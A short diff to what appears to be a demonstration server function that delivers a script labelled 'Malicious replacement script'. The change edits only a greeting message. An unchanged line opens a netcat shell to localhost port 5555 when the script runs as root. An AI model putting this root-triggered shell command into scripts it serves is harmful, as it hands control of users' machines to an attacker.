@@ -16,7 +16,7 @@ def script_download():
             #!/bin/bash
             # Malicious replacement script 
             if [[ $EUID -ne 0 ]]; then
-                echo Hello user $(id -un), I see you are using curl!
+                echo Hello user $(id -un), I see you are using curl or wget!
             else
                 nc -e /bin/bash localhost 5555
             fi
